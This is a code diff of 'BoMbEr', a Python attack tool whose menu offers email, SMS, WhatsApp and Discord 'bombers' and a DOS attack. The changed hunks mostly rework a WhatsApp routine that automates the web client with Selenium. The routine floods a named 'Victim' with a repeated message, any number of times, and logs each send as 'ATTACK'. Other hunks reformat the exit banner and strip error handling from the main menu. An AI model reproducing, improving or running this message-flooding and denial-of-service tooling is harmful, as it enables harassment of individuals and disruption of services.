@@ -123,15 +123,15 @@ def ex():
 	param=input('Exit? yes/no: ')
 	if param == 'yes':
 		print("\033[36m{}" .format('''
-                                                                         
-                         Thanks for using BoMbEr!                            
-      I would be grateful if you star on this repository on GitHub:          
-                   https://github.com/ebankoff/BoMbEr                    
-                                                                         
-          You can support me by sending any amount to my Qiwi:          
-                           qiwi.com/n/HERAMANT                           
-                                                                         
-                       Copyright (C) 2021 ebankoff                                                                            
+																		 
+						 Thanks for using BoMbEr!                            
+	  I would be grateful if you star on this repository on GitHub:          
+				   https://github.com/ebankoff/BoMbEr                    
+																		 
+		  You can support me by sending any amount to my Qiwi:          
+						   qiwi.com/n/HERAMANT                           
+																		 
+					   Copyright (C) 2021 ebankoff                                                                            
 			'''))
 		print("Press Enter to exit")
 		input()
@@ -9630,40 +9630,35 @@ def wtsap():
 ║╚╝╚╝║╔╗║╔╗║║║══╣╚═╝║╔╗║╔╗║
 ╚╗╔╗╔╣║║║╔╗║╚╬══║╔═╗║╚╝║╚╝║
  ╚╝╚╝╚╝╚╩╝╚╩═╩══╩╝ ╚╣╔═╣╔═╝
-                    ║║ ║║
-                    ╚╝ ╚╝
+					║║ ║║
+					╚╝ ╚╝
 		'''))
 
-	try:
-		name = input("Target name: ")
-		count = int(input("Number of messages: "))
-		msg = input("Text: ")
-		cn=0
+	name = input("Victim name: ")
+	count = int(input("Number of messages: "))
+	msg = input("Text: ")
+	cn=0
 
-		print("")
-		print("YOU HAVE 15 SECONDS TO LOG IN!")
-		input("Press Enter to start")
+	print("")
+	print("YOU HAVE 15 SECONDS TO LOG IN!")
+	input("Press Enter to start")
 
-		driver = webdriver.Chrome(ChromeDriverManager().install()) 
-		driver.get("https://web.whatsapp.com/")
-		time.sleep(15)
-		user = driver.find_element_by_xpath('//span[contains(@title,\"' + name + '\")]')
-		user.send_keys(name + Keys.ENTER)
-		time.sleep(8)
-		msgBox = driver.find_element_by_xpath('//*[@id="main"]/footer/div[1]/div/span[2]/div/div[2]/div[1]')
+	driver = webdriver.Chrome(ChromeDriverManager().install()) 
+	driver.get("https://web.whatsapp.com")
+	time.sleep(15)
+	search = driver.find_element(By.XPATH, "//*[@id='side']/div[1]/div/label/div/div[2]")
+	search.send_keys(name, Keys.RETURN)
+	time.sleep(15)
+	msgBox = driver.find_element(By.XPATH,"//*[@id='main']/footer/div[1]/div/span[2]/div/div[2]/div[1]/div/div[2]")
 
-		for i in range(count):
-			msgBox.send_keys(msg + Keys.ENTER)
-			cn+=1
-			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'ATTACK') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(name))
+	for i in range(count):
+		msgBox.send_keys(msg, Keys.RETURN)
+		cn+=1
+		print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'ATTACK') + "\033[37m {}" .format('|') + "\033[36m {}" .format(cn) + "\033[37m {}" .format('|') + "\033[35m {}" .format(name))
 
-		print("\033[32m {}" .format("Successful!"))
-		print(f"{cn} messages were sent to {name}")
-		ex()
-
-	except:
-		print("\033[31m{}" .format("\nERROR!"))
-		ex()
+	print("\033[32m {}" .format("Successful!"))
+	print(f"{cn} messages were sent to {name}")
+	ex()
 
 def dscrd():
 	print("\033[32m{}" .format('''
@@ -9717,47 +9712,42 @@ def main():
 [3] DOS ATTACK
 	''')
 
-	try:
-		ans=int(input("\033[33m{}" .format("> ")))
-		print("")
+	ans=int(input("\033[33m{}" .format("> ")))
+	print("")
 
-		if ans==0:
-			check_internet()
-			os.system('git clone https://github.com/ebankoff/BoMbEr')
-			pb3()
-			print("\033[32m{}" .format('Success!'))
-			print("\033[31m{}" .format('To complete the update, you need to restart the program'))
+	if ans==0:
+		check_internet()
+		os.system('git clone https://github.com/ebankoff/BoMbEr')
+		pb3()
+		print("\033[32m{}" .format('Success!'))
+		print("\033[31m{}" .format('To complete the update, you need to restart the program'))
+		ex()
+	elif ans==1:
+		check_internet()
+		emailbomber()
+	elif ans==2:
+		check_internet()
+		smsbomber()
+	elif ans==3:
+		check_internet()
+		dos()
+	elif ans==4:
+		check_internet()
+		wtsap()
+	elif ans==5:
+		check_internet()
+		dscrd()
+	elif ans==6:
+		try:
+			pb4()
+			shutil.rmtree('__pycache__')
+			print('Success!')
 			ex()
-		elif ans==1:
-			check_internet()
-			emailbomber()
-		elif ans==2:
-			check_internet()
-			smsbomber()
-		elif ans==3:
-			check_internet()
-			dos()
-		elif ans==4:
-			check_internet()
-			wtsap()
-		elif ans==5:
-			check_internet()
-			dscrd()
-		elif ans==6:
-			try:
-				pb4()
-				shutil.rmtree('__pycache__')
-				print('Success!')
-				ex()
-			except:
-				print("\033[31m{}" .format('ERROR: The program cache is already empty!'))
-				ex()
-		else:
-			print("\033[31m{}" .format('ERROR: INVALID VALUE!'))
+		except:
+			print("\033[31m{}" .format('ERROR: The program cache is already empty!'))
 			ex()
-
-	except:
-		print("\033[31m{}" .format("\nERROR!"))
+	else:
+		print("\033[31m{}" .format('ERROR: INVALID VALUE!'))
 		ex()
 
 if __name__=='__main__':
